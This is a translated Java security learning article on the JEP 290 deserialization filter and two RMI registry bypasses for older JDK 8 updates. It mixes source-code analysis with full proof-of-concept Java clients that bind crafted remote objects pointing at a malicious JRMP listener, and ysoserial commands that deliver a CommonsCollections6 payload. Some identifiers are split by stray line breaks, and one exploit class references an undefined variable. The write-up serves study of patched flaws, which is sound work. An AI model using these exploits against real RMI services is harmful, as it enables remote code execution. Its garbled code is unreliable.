#Java Security Learning—JEP290

Author: H3rmesk1t

Data: 2022.01.29


# Introduction
`JEP 290` is a solution proposed by the Java underlying layer to alleviate deserialization attacks. The ideal state is to let developers deserialize only the classes they want to deserialize. Using such a `CC chain` will cause them to be unable to deserialize `Tranformer`, `HashMap`, etc., thus not being able to trigger vulnerabilities.

[Official Description](http://openjdk.java.net/jeps/290)

![JEP290 official description](./images/1.png)

`JEP 290` mainly describes the following mechanisms:
 - Provide a flexible mechanism to narrow the classes that can be deserialized from any class available to an application down to a context-appropriate set of classes. (Provides a flexible mechanism to narrow the classes that can be deserialized from any class available to an application down to a context-appropriate set of classes.)
 - Provide metrics to the filter for graph size and complexity during deserialization to validate normal graph behaviors. (Limit the depth and complexity of deserialization)
 - Provide a mechanism for RMI-exported objects to validate the classes expected in invocations.
 - The filter mechanism must not require subclassing or modification to existing subclasses of ObjectInputStream. (The filter mechanism must not require subclassing or modification to existing subclasses of ObjectInputStream.)
 - Define a global filter that can be configured by properties or a configuration file. (Define a configurable filter mechanism, for example, filters can be defined by configuring properties files)

`JEP 290` filtering rules are as follows:
 - If the pattern starts with "!", if the rest of the pattern matches, the class is rejected, otherwise it is accepted.
 - If the pattern contains "/", the non-null prefix before "/" is the module name. If the module name matches the module name of the class, the remaining pattern matches the class name. If there is no "/", the module name is not compared.
 - If the pattern ends with ".**", it matches any class in the package and all subpackages
 - If the pattern ends with ".*", it matches any class in the package
 - If the pattern ends with "*", it matches any class prefixed with that pattern.
 - If the pattern is equal to the class name, match.
 - Otherwise the status is not determined.

![Process-wide Filter](./images/15.png)

`JEP 290` was added in `JDK 9`, but also in some higher versions of `JDK 6, 7, 8`, specifically `JDK 8u121`, `JDK 7u131` and `JDK 6u141`. [Official Note](https://blogs.oracle.com/java-platform-group/filter-incoming-serialization-data-a-little-of-jdk-9-goodness-available-now-in-current-release-families)

![JEP 290 added in JDK678](./images/2.png)

# JEP290 Actual Limitations
Here we use `8u311` and `8u66` to compare. The sample code is as follows:

 - RMIServer.java
```java
package org.h3rmesk1t.jep290;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/1/30 7:52 pm
 */
public class RMIServer {

    // Parameter configuration
    public static String HOST = "localhost";
    public static int PORT = 8888;
    public static String RMI_PATH = "/demo";
    public static final String RMI_NAME = "rmi://" + HOST + ":" + PORT + RMI_PATH;

    public static void main(String[] args) {
        try {
            // Register RMI port
            LocateRegistry.createRegistry(PORT);

            // Create a service
            RemoteImpl remoteImpl = new RemoteImpl();

            // Service naming binding
            Naming.bind(RMI_NAME, remoteImpl);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

 - RemoteImpl.java
```java
package org.h3rmesk1t.jep290;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/1/30 7:53 pm
 */
public class RemoteImpl extends UnicastRemoteObject implements RemoteInterface {

    protected RemoteImpl() throws RemoteException {
    }

    @Override
    public String demo() throws RemoteException {
        return "Hello, h3rmesk1t!";
    }

    @Override
    public String demo(Object object) throws RemoteException {
        return object.getClass().getName();
    }
}
```

 - RemoteInterface.java
```java
package org.h3rmesk1t.jep290;

import java.rmi.Remote;
import java.rmi.RemoteException;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/1/30 7:53 pm
 */
public interface RemoteInterface extends Remote {

    public String demo() throws RemoteException;

    public String demo(Object object) throws RemoteException;
}
```

Use `ysoserial.exploit.RMIRegistryExploit` in the `ysoserial` project to attack. You can find that when the `jdk8` version is greater than `8u121` to start `RMIServer`, it will show that the attack failed; when it is lower than `8u121`, it can successfully attack and pop up the calculator.

![8u311](images/4.png)

![8u66](./images/5.png)

# Core Class
The core classes involved in `JEP 290 are: `ObjectInputStream` class, `ObjectInputFilter` interface, `Config` static class and `Global` static class. The `Config` class is the inner class of the `ObjectInputFilter` interface, and the `Global` class is the inner class of the `Config` class.


## ObjectInputStream class
Follow up on the error message during previous tests, follow up on the `java.io.ObjectInputStream` class, and `JEP 290` filtering method is to add a `serialFilter` property and a `filterChcek` function to the `ObjectInputStream` class, which are used to implement filtering.

### Constructor
The ObjectInputStream class contains two constructors. It should be noted that the property `serialFilter` will be assigned to Config.getSerialFilterFact in both constructors.
orySingleton().apply(null, Config.getSerialFilter())`.

![serialFilter](./images/6.png)

Follow up on `Config.getSerialFilter()`, you can see that `ObjectInputFilter.Config.getSerialFilter()` returns the `serialFilter` static field in the `ObjectInputFilter#Config` static class.

![getSerialFilter](./images/7.png)

### serialFilter property
The `serialFilter` property is an `ObjectInputFilter` interface type, and this interface declares a `checkInput` method.

![serialFilter](./images/8.png)

![checkInput](./images/9.png)

### filterCheck function
In the `filterCheck` function, the function logic process can be roughly divided into three steps:
  1. First determine whether the attribute value of `serialFilter` is `null`. When it is not `null`, filtering will be performed.
  2. After judging that the property value of `serialFilter` is not `null`, create a `FilterValues` object, encapsulate the information that needs to be checked, and then call the `serialFilter.checkInput` method for judgment, and return the return value of `ObjectInputFilter.Status` type
  3. Make judgments based on the return value. An exception will be thrown when the return value is `null` or `ObjectInputFilter.Status.REJECTED`.

![filterCheck](./images/10.png)

## ObjectInputFilter Interface
This interface is the most basic interface to implement filtering operations in `JEP 290`. The fully qualified name is `sun.misc.ObjectInputFIlter` when it is lower than `JDK 9`, and `java.io.ObjectInputFilter` and above are `java.io.ObjectInputFilter`. The structure of the `ObjectInputFilter` interface is roughly divided into `checkInput` function, `Config` static class, `FilterInfo` interface, and `Status` enumeration class.

![ObjectInputFilter](./images/11.png)

## Config static class
The static class of `Config` is an internal static class of the `ObjectInputFilter` interface. When initialized, `Config.serialFilter` will be assigned to a `Global` object. The static field of `ObjectInputStream` constructor takes the static field of `Config.serialFilter`, so setting the static field of `Config.serialFilter` is equivalent to setting the `ObjectInputStream` class global filter.

![Config](./images/12.png)

Here, you can set the `Config.serialFilter` field value of the `jdk.serialFilter` of the `JVM` or `%JAVA_HOME%\conf\security\java.security` file to set the `Config.serialFilter` field value, and also set the global filtering. There are also some frameworks that set the `Config.serialFilter` at the beginning to set the `ObjectInputStream` global filtering of the `ObjectInputStream` class, for example, when `weblogic` is started, it will set the `Config.serialFilter` to the `WebLogicObjectInputFilterWrapper` object.

### createFilte method
`Config#createFilter` will further call the `Global.createFilter` method. The main function is to parse the incoming `JEP 290` rule string on the `filters` field of the `Global` object and return this `Global` object.

![createFilter](./images/13.png)

### getSerialFilter method
The main function of `Config#getSerialFilter` is to return the field value of `Config#serialFilter`.

![getSerialFilter](./images/14.png)

## Global Static Class
The `Global` static class is an internal static class in the `Config` class. Its important feature is that it implements the `checkInput` method in the `ObjectInputFilter` interface. Therefore, the `Global` class can be directly assigned to the `ObjectInputStream.serialFilter`.

### Constructor
The constructor in `Global` parses the `JEP 290` rule to the corresponding `lambda` expression and is then added to `Global.filters`.

![global](./images/16.png)

### filters field
The `filters` field is used as a function list and is used for subsequent filtering operations.

### checkInput method
The `checkInput` method will traverse `filters` to detect the class to be deserialized.

![checkInput](./images/9.png)

# Filter
As mentioned in the ObjectInputStream class in the core class, configuring a filter is actually to set the `serialFilter` property in the `ObjectInputStream` class. It is not difficult to see that there are two types of filters:
 1. Global filters configured through configuration file or `JVM` attribute.
 2. Configure local filters by changing the `serialFilter` property of `ObjectInputStream`.

## Global Filter
The global filter is actually filtered by setting the static field value of the `serialFilter` in the static class of `Config`. The above mentioned that in the two constructors of `ObjectInputStream`, the `serialFilter` attribute will be assigned to the `Config.getSerialFilterFactorySingleton().apply(null, Config.getSerialFilter())`, and through the call chain, we can know that the last returned is `Config#serialFilter`.

### jdk.serailFilter
As mentioned above, when the static class `Config` is initialized, the `JEP 290` rules set by the `jdk.serailFilter` property will be parsed to the `filters` property of a `Global` object, and the `Global` object will be assigned to the `serialFilter` property of the `Config.serialFilter` property. Therefore, the `Config.serialFilter` value is by default to parsing the `jdk.serailFilter` property to obtain the `Global` object.

## Local filter
Local filters actually implement local filtering by changing the `serialFilter` field value of a single `ObjectInputStream` object after the `new objectInputStream` object. There are usually two ways to achieve this:
 - Call the `setInternalObjectInputFilter` method of the `ObjectInputStream` object (below `JDK 9`, getInternalObjectInputFilter` and `setInternalObjectInputFilter`, `JDK 9` and above are `getObjectInputFilter` and `setObjectInputFIlter`).

![ObjectInputStream#setInternalObjectInputFilter](./images/17.png)

 - SetObjectInputFIlter method of static class `Config`.

![Config#setObjectInputFIlter](./images/18.png)

# RMI filtering mechanism
The local filtering mechanism is used in `RMI`. For the specific learning of `RMI`, you can take a look at the previous [Java Security Learning-RMI Learning](https://github.com/H3rmesk1t/Learning_summary/blob/main/2022-1-19/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-RMI%E5%AD%A6%E4%B9%A0.md#) or [official document](https://docs.oracle.com/javase/tutorial/rmi/overview.html)

## RegistryImpl Objects and JEP290
As a special object, the `RegistryImpl` is exported on the `RMI` server side, and the client calls the `bind`, lookup, list`, etc. It is actually the `bindings`Hashtable` operation of `RegistryImpl`. The `Target` object generated during the export process is a "customized" `Target` object, which is specifically reflected in:
 - The objNum of `id` in `Target` is fixed, which is `ObjID.REGISTRY_ID`, that is `0`.
 - `disp` is `filter` for `Regis in `Target`
ryImpl::RegistryFilter`, `skel` is the UnicastServerRef` object of `RegsitryImpl_skel`.
 - The stub in `Target` is `RegistryImpl_stub`.

![bindings](./images/19.png)

## DGCImpl Objects and JEP290
The `DGCImpl` object and the `RegistryImpl` object are similar to both a special object. The special manifestation of its `Target` object is:
 - The objNum of `id` in `Target` is fixed, which is `ObjID.DGC_ID`, that is `2`.
 - In `Target`, disp` is a `UnicastServerRef` object with `filter` DGCImpl::DGCFilter` and `skel` is `DGCImpl_skel`.
 - `stub` in `Target` is `DGC_stub`.

## Configure through JVM parameters or configuration files
### RegistryImpl
`RegistryImpl` contains a static field `registryFilter`, so when the `new RegistryImpl` object is used, the `initRegistryFilter` method will be called for assignment.

```java
private static final ObjectInputFilter registryFilter = (ObjectInputFilter)AccessController.doPrivileged(RegistryImpl::initRegistryFilter);
```

Follow up on the `RegistryImpl#initRegistryFilter` method. First, the property of the `sun.rmi.registry.registryFilter` of the `JVM` will be read. When it is `null`, the `%JAVA_HOME%\conf\security\java.security` configuration file will be read to get the `pattern` of the `JEP 290`. Then call `ObjectInputFilter.Config.createFilter2` to create `filter` and return.

![RegistryImpl#initRegistryFilter`](./images/20.png)

Here we use the `java.security` file of `jdk8u311` for example.

![pathOfJavaSecurity](./images/21.png)

![java.security](images/22.png)

It should be noted that there is a function `RegistryImpl#registryFilter`, which will first determine whether the static field `registryFilter` is `null` to decide whether to use user-defined filtering rules or use the default whitelist rules. If it is not `null`, the user-defined filtering rules will be called first to check, and then the check result will be judged. If it is not `UNDECIDED`, the check result will be returned directly, otherwise the default whitelist check will be used.

![RegistryImpl#regstiryFilter](./images/23.png)

### DGCImpl
`DGCImpl` contains a static field `dgcFilter`, so when the `new DGCImpl` object is `initDgcFilter` method will be called for assignment.

![DGCImpl#dgcFilter](./images/24.png)

Follow up on the `DGCImpl#initDgcFilter` method, first read the `sun.rmi.transport.dgcFilter` property of the `JVM`. When it is `null`, it will read the `sun.rmi.transport.dgcFilter` field in the `%JAVA_HOME%\conf\security\java.security` configuration file to get the `pattern` of the `JEP 290` form, and then call `ObjectInputFilter.Config.createFilter` to create `filter` and return.

![DGCImpl#initDgcFilter](./images/25.png)

Here we use the `java.security` file of `jdk8u311` for example.

![java.security](images/26.png)

There is a function similar to the `RegistryImpl#registryFilter` function in `DGCImpl#checkInput`, which will first determine whether the `DGCImpl#dgcFilter field is `null`, thereby deciding whether to use user-defined filtering rules or use the default whitelist rules. If it is not `null`, the user-defined filtering rules will be called first to check, and then the check result will be judged. If it is not `UNDECIDED`, the check result will be returned directly, otherwise the default whitelist check will be used.

![DGCImpl#checkInput](./images/27.png)

# RMI-JEP290 Bypass
In RMI, JEP 290 is mainly filtered on the remote reference layer, so its filtering effect is invalid for the mutual attacks between Server and Client (after completing the communication with Registry, the communication between the client and the server reaches the remote reference layer and the transport layer).

![server-client](./images/28.png)

The whitelist content in `RegistryImpl#registryFilter` is:
 - String
 - Number
 - Remote
 - Proxy
 - UnicastRef
 - RMIClientSocketFactory
 - RMIServerSocketFactory
 - ActivationID
 - UID

The whitelist contents in `DGCImpl#checkInput` are:
 - ObjID
 - UID
 - VMID
 - Lease

As long as the deserialized class is not a class on the whitelist, the `REJECTED` operator will be returned, indicating that there is illegal content in the serialized stream and an exception will be thrown directly.

## 8u121~8u230
### UnicastRef class
This class can be seen in the whitelist in `RegistryImpl#registryFilter`, which is also the basis for communication between `RMIServer` or `RMIClient` and `Registry`. When we execute operations such as `lookup`, `bind`, etc., we often get a `Registry` first. The example code is as follows:

```java
package org.h3rmesk1t.jep290;

import org.h3rmesk1t.rmi.RemoteInterface;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/1/30 7:53 pm
 */
public class RMIClient {
    public static void main(String[] args) throws Exception {

        // Get remote object instance
        // RemoteInterface stub = (RemoteInterface) Naming.lookup("//localhost:4444/demoCaseBegin");

        // Get remote object instance
        Registry registry = LocateRegistry.getRegistry("localhost", 7777);
        org.h3rmesk1t.rmi.RemoteInterface stub = (RemoteInterface) registry.lookup("demo");

        // Method call
        System.out.println("Method call result: " + stub.demoCaseBegin(stub.openCalculatorObject()));
    }
}
```

Follow up on the `LocateRegistry#getRegistry` method, first use TCPEndpoint` to encapsulate the `host`, port` and other information of `Registry`, and then use `UnicastRef` to encapsulate a `UnicastRef` object, and finally obtain a `RegistryImpl_Stub` object that encapsulates a `UnicastRef` object.

![LocateRegistry#getRegistry](./images/29.png)

Then put the breakpoint at `lookup` and see how the stub object in `Client` is connected to `Registry`. After following up, it is not difficult to see that the connection process is to initiate the connection through the `UnicastRef` newCall` method, and then send the object to be bound to `Registry`. Therefore, if we can control the `host`, port` and other information encapsulated by `UnicastRef#LiveRef`, we can initiate an arbitrary `JRMP` connection request. This `trick` point and `payloads.JRMPClient` in `ysoserial` are the same principle.

![lookup](./image
s/30.png)

### RemoteObject Class
`RemoteObject` implements the `Remote` and `Serializable` interfaces, and `Remote` is the content of the whitelist in `RegistryImpl#registryFilter`, so it and its subclasses can be detected by whitelist. In subsequent analysis, the `RemoteObject#readObject` method is used. The `ref` in its last `ref.readExternal(in)` happens to be a `UnicastRef` object.

![RemoteObject#readObject](./images/31.png)

Follow up on the `UnicastRef#readExternal` method, which will then call the `LiveRef#read` method.

![UnicastRef#readExternal](./images/32.png)

Follow up on the `LiveRef#read` method, in which the `TCPEndpoint#readHostPortFormat` method will be called first to read out the `host` and `port` related information in the serialized stream, and then repackage it into a `LiveRef` object and store it on the current `ConnectionInputStream`.

![LiveRef#read](./images/33.png)

Follow up on the `ConnectionInputStream#saveRef` method, which establishes a mapping relationship between `TCPEndpoint` to `ArrayList<LiveRef>`.

![ConnectionInputStream#saveRef](./images/34.png)

Go back to the previous `RemoteObject#readObject` method, here `readObject` is triggered by the `readObject` method in `RegistryImpl_Skle#dispatch`.

![RegistryImpl_Skle#dispatch](./images/35.png)

After the server triggers deserialization, continue to go down and call the `StreamRemoteCall#releaseInputStream` method. The `this.in` here is the ConnectionInputStream` object stored in the `LiveRef` object mentioned earlier. Here, the `ConnectionInputStream#registerRefs` method will be called.

![StreamRemoteCall#releaseInputStream`](./images/36.png)

Follow up on `ConnectionInputStream#registerRefs`, and you will find that the corresponding value will be extracted based on the mapping relationship established in the `ConnectionInputStream#saveRef` method before, and then passed it into the `DGCClient#registerRefs` method.

![ConnectionInputStream#registerRefs](./images/37.png)

Follow up on the `DGCClient#registerRefs` method, you can see here that `DGCClient` initiates a `lookup` connection to the malicious `JRMP` server.

![DGCClient#registerRefs](./images/38.png)

### ByPass
In the above analysis of the two classes `UnicastRef` and `RemoteObject`, we can find:
 - The `RemoteObject` class and its subclass objects can be `bind` or `lookup` to `Registry` and are on the whitelist.
 - The `RemoteObject` class and its subclasses that do not implement the `readObject` method are deserialized and can initiate a `JRMP` request to connect to a malicious `Server` through the internal `UnicastRef` object.

At this point, the idea of ​​`ByPass JEP-290` has been very clear:
 1. `ysoserial` enables a malicious `JRMPListener`.
 2. Control the `UnicastRef` object in `RemoteObject` (encapsulates the `host`, `port` and other information of malicious `Server`).
 3. `Client` or `Server` sends this `RemoteObject` object to `Registry`. After `Registry` triggers the `readObject` method, it will initiate a connection request to the malicious `JRMP Server`.
 4. `JRMPListener` is successfully triggered after the connection is successful.

`Registry` triggers deserialization utilization chain as follows:

```text
Client sends data ->...
UnicastServerRef#dispatch –>
UnicastServerRef#oldDispatch –>
RegistryImpl_Skle#dispatch –> RemoteObject#readObject
StreamRemoteCall#releaseInputStream –>
ConnectionInputStream#registerRefs –>
DGCClient#registerRefs –>
DGCClient$EndpointEntry#registerRefs –>
DGCClient$EndpointEntry#makeDirtyCall –>
DGCImpl_Stub#dirty –>
UnicastRef#invoke –> (RemoteCall var1)
StreamRemoteCall#executeCall –>
ObjectInputSteam#readObject –> "demo"
```

The key to `ByPass JEP-290` is to change `Registry` to `JRMP` client through deserialization, and initiate a `JRMP` request to `JRMPListener`.

![ByPass JEP-290](./images/39.png)

Another thing to note here is that you need to find a class implementation class `RemoteObject` method.

![findClass](./images/40.png)

### Demo
The test code is as follows:
 - RMIRegistry

```java
package org.h3rmesk1t.jep290.bypass8u230;

import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/4 2:13 am
 */
public class RMIRegistry {

    public static void main(String[] args) throws RemoteException {

        LocateRegistry.createRegistry(2222);
        System.out.println("RMI Registry Start...");

        while (true);
    }
}
```
 - RMIClient

```java
package org.h3rmesk1t.jep290.bypass8u230;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/4 2:15 am
 */
public class RMIClient {

    public static void main(String[] args) throws RemoteException, AlreadyBoundException {

        Registry registry = LocateRegistry.getRegistry(2222);
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 9999);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        registry.bind("demo", obj);
    }
}
```
- ysoserial

```bash
java -cp ~/Desktop/ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 'open /System/Applications/Calculator.app'
```

![bypass jdk8u121-jdk8u130](./images/41.png)

### Fixed
The `DGCImpl_Stub#dirty` method of `JDK8u231` version and above has an additional `setObjectInputFilter` process, resulting in `JEP 290` being able to check` again.

![](./images/58.png)

## 8u231~8u240
When `ByPass 8u121~8u230`, the `UnicastRef` class uses a layer of wrapping, and initiates a `JRMPListener` request through `DGCClient` to `JRMPListener`. In the `jdk8u231` version and above `setObjectInputFilter` process, it will be checked by `JEP290`. The `Gadget` of `ByPass 8u231~8u240` is as follows:

```text
Client sends data –> Server deserialization (RegistryImpl_Skle#dispatch)
UnicastRemoteObject#readObject –>
UnicastRemoteObject#reexport –>
UnicastRemoteObject#exportObject –> overload
UnicastRemoteObject#exportObject –>
UnicastServerRef#exportObject –> …
TCPTransport#listen –>
TcpEndpoint#newServerSocket –>
RMIServerSocketFactory#createServerSocket –> Dynamic Proxy(RemoteObjectInvocationHandler)
RemoteObjectInvocationHandler#invoke –>
RemoteObjectInvocationHandler#invokeMethod –>
UnicastRef#invoke –> (Remote var1, Method var2, Object[] var3, long var4)
StreamRemoteCall#executeCall –>
ObjectInputSteam#readObject –> "demo"
```

### Gadget Analysis
First, follow up on the `UnicastRemoteObject#readObject` method, and continue to call the `UnicastRemoteObject#reexport` method at the end. Here we call two overloaded methods by judging whether there are settings of `csf` and `ssf`.

![UnicastRemoteObject#readObject](./images/42.png)

![UnicastRemoteObject#reexport](./images/43.png)

Since `ssf` is set in `exploit` of `ByPass`, follow up here the `exportObject` method in `else`. Follow up on `UnicastRemoteObject#exportObject` method, here the `port`, `csf`, and `ssf` are passed as constructor parameters into `UnicastServerRef2`.

![UnicastRemoteObject#exportObject](./images/44.png)

Following up on the `UnicastServerRef2` method, it found that it has a layer of `LiveRef` encapsulated inside.

![UnicastServerRef2](./images/45.png)

Continue to go back to the previous step, follow up on the overloaded `UnicastRemoteObject#exportObject` method, continue to call the `UnicastServerRef#exportObject` method. This has been analyzed in the previous article analyzing `RMI`. The general process is to create the `RegistryImpl_Stub` and `RegistryImpl_Skel` objects, and finally call the `TCPTransport#listen` method to create the listening stack.

The TCPTransport#listen method creates a listening stack.

![UnicastRemoteObject#exportObject](./images/46.png)

![UnicastServerRef#exportObject](./images/47.png)

Follow up on the `TCPTransport#listen` method, create a `TCPEndpoint` object, further call the `TCPEndpoint#newServerSocket` method. There is a layer of dynamic proxy here, proxying the `RMIServerSocketFactory` interface through the `RemoteObjectInvocationHandler` interface, and then set the generated proxy object to the `ssf`.

![TCPTransport#listen](./images/48.png)

![TCPEndpoint#newServerSocket](./images/49.png)

Follow up on the `RemoteObjectInvocationHandler#invoke` method. In the `if-else` judgment, all `if` conditions are not true. Call the `RemoteObjectInvocationHandler#invokeRemoteMethod` method. Since the `ref` here is controllable, after setting it to `UnicastRef`, call the `UnicastRef#invoke` method.

![RemoteObjectInvocationHandler#invoke](./images/50.png)

![RemoteObjectInvocationHandler#invokeRemoteMethod](./images/51.png)


Follow up on the `UnicastRef#invoke` method, `Registry` initiates a `JRMP` request to `JRMPListener` for data interaction, and will successfully call the `StreamRemoteCall#executeCall` method.

![UnicastRef#invoke`](./images/52.png)

In the `StreamRemoteCall#executeCall` method, deserialize the `Payload` of `JRMPListener`. Since the `Filter` of `JEP 290` is not set after `InputStream` is obtained here, `ByPass` was successful.

![StreamRemoteCall#executeCall](./images/53.png)

### Demo
It should be noted that when an object is `bind` or `rebind`, the `MarshalOutputStream#replaceObject` method will come to the `MarshalOutputStream#replaceObject` method when serializing the object. If this object does not inherit `RemoteStub`, the original `UnicastRemoteObject` will be converted into `RemoteObjectInvocationHandler`, and the server will not be able to trigger the `UnicastRemoteObject#readObject` method. Here, you can rewrite the `RegistryImpl#bind` method, reflect the `ObjectInputStream` before serialization, and modify the `enableReplace` to `false`

![](./images/54.png)

![](./images/55.png)

The test code is as follows:

 - RMIRegistry

```java
package org.h3rmesk1t.jep290.bypass8u230;

import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/4 2:13 am
 */
public class RMIRegistry {

    public static void main(String[] args) throws RemoteException {

        LocateRegistry.createRegistry(6666);
        System.out.println("RMI Registry Start...");

        while (true);
    }
}
```

 - RMIServer

```java
package org.h3rmesk1t.jep290.bypass8u240;

import sun.rmi.registry.RegistryImpl_Stub;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ObjectOu
tput;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.Random;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/4 3:31 am
 */
public class RMIServer {

    public static void main(String[] args) throws Exception {

        UnicastRemoteObject payload = getPayload();
        Registry registry = LocateRegistry.getRegistry(6666);
        bindReflection("demo", payload, registry);
    }

    static UnicastRemoteObject getPayload() throws Exception {

        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("localhost", 9999);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));

        System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);
        RMIServerSocketFactory factory = (RMIServerSocketFactory) Proxy.newProxyInstance(
                handler.getClass().getClassLoader(),
                new Class[]{RMIServerSocketFactory.class, Remote.class},
                Handler
        );

        Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor();
        constructor.setAccessible(true);
        UnicastRemoteObject unicastRemoteObject = constructor.newInstance();

        Field field_ssf = UnicastRemoteObject.class.getDeclaredField("ssf");
        field_ssf.setAccessible(true);
        field_ssf.set(unicastRemoteObject, factory);

        return unicastRemoteObject;
    }

    static void bindReflection(String name, Object obj, Registry registry) throws Exception {

        Field ref_filed = RemoteObject.class.getDeclaredField("ref");
        ref_filed.setAccessible(true);
        UnicastRef ref = (UnicastRef) ref_filed.get(registry);

        Field operations_filed = RegistryImpl_Stub.class.getDeclaredField("operations");
        operations_filed.setAccessible(true);
        Operation[] operations = (Operation[]) operations_filed.get(registry);

        RemoteCall remoteCall = ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);
        ObjectOutput outputStream = remoteCall.getOutputStream();

        Field enableReplace_filed = ObjectOutputStream.class.getDeclaredField("enableReplace");
        enableReplace_filed.setAccessible(true);
        enableReplace_filed.setBoolean(outputStream, false);

        outputStream.writeObject(name);
        outputStream.writeObject(obj);

        ref.invoke(remoteCall);
        ref.done(remoteCall);
    }
}
```

 - ysoserial

```bash
java -cp ~/Desktop/ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 'open /System/Applications/Calculator.app'
```

![](./images/56.png)

### Fixed
`JDK8u241` class that declares the method to be called in `RemoteObjectInvocationHandler#invokeRemoteMethod` must implement the `Remote` interface, while the `RMIServerSocketFactory` class does not implement the interface, so an exception will be thrown directly and cannot be called.

![](./images/57.png)

# refer to
 - [Archive JEP 290](https://paper.seebug.org/1689/)

 - [Analysis and Bypass of RMI-JEP290](https://www.anquanke.com/post/id/259059)

 - [The end of deserialization vulnerability? Research on the mechanism of JEP290](https://paper.seebug.org/454/)

 - [JEP 290: Filter Incoming Serialization Data](https://openjdk.java.net/jeps/290)

# tool
When I was studying, I searched for the ready-made `ysoserial` package for a long time. I latched a `ysoserial` download link (I hope I won't send it) for easy use during subsequent study and review.
 - [ysoserial](https://jitpack.io/com/github/frohoff/ysoserial/)

In the bypass method of attacking the `RMI` server analyzed above, there are some ready-made tools on the Internet, such as:
 - [rmitast](https://github.com/STMCyber/RmiTaste)

 - [rmisout](https://github.com/BishopFox/rmiscout)